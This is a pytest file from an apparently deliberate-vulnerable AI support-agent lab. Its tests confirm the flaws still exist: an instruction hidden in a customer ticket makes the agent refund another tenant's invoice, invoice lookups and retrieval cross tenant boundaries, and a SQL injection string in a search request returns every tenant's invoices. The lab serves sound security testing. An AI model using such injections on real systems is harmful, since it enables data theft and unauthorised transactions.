"""Exploit tests. Each one PASSES while the vulnerability is present.

If one of these starts failing, the vulnerable agent changed and the matching
finding in FINDINGS.md needs a second look.
"""

from conftest import ACME_SUPPORT, refunds

from lab.data import DOCUMENTS
from lab.vulnerable.agent import Agent

ALL_INVOICES = {"INV-1001", "INV-1002", "INV-2001", "INV-2002"}


def test_vuln01_injected_ticket_refunds_another_tenants_invoice(db):
    # A support user (no refund rights) only asks for a summary.
    Agent(db, DOCUMENTS).ask("Summarize ticket 17", ACME_SUPPORT)
    # The instruction hidden in the customer's ticket ran as that user.
    assert refunds(db) == [("INV-2001", 9800.0, "ana")]


def test_vuln01_get_invoice_reads_another_tenants_invoice(db):
    out = Agent(db, DOCUMENTS).ask("Show invoice INV-2001", ACME_SUPPORT)
    assert out["tool_results"] == [("get_invoice", ("INV-2001", "Globex Inc", 9800.0, "open"))]


def test_vuln02_retrieval_leaks_another_tenants_document(db):
    out = Agent(db, DOCUMENTS).ask("What enterprise discount do we offer on renewals?", ACME_SUPPORT)
    assert "CONFIDENTIAL Globex pricing" in out["answer"]


def test_vuln03_sql_injection_returns_every_tenants_invoices(db):
    out = Agent(db, DOCUMENTS).ask("search invoices for zzz' OR tenant LIKE '%", ACME_SUPPORT)
    name, rows = out["tool_results"][0]
    assert name == "search_invoices"
    assert {r[0] for r in rows} == ALL_INVOICES
